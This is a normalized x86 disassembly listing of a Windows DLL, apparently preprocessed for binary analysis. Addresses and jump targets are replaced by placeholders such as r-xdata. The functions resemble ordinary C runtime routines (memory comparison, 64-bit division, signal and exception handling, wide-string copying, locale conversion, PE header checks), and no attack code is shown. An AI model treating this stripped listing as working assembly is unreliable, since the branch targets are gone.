setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_10025df0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_10025e50
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10025f03
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_10025f47
push 0x20
push r--data
call sub_10020070
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1001e29d
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_100200b5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_10025f03
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1001edc2
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_10023fbf
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_1001e166
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100260ae
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_100260f0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10026180
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_100267e5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10026804
jmp r-xdata
sub_10026180
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_1001a809
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_100260f0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100261e2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10026212
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10026242
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_1001e166
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_100263ae
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1001bddd
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_1001ea75
mov eax esi
sub_10026423
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_1001bddd
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_1001ea75
mov eax esi
jmp r-xdata
sub_100264f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_1002650b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1001bddd
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_1001ea75
mov eax esi
sub_1002656e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_100265ad
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1001a809
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_1001b44f
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_1001aa2a
pop ecx
cmp eax esi
je r-xdata
call sub_100228e0
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_10026687
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100265ad
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100266d0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100266f0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_1001a809
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10026735
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10026735
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_100266f0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_100267e5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10026804
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_100267dc
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_100267e5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10026810
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_10026850
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
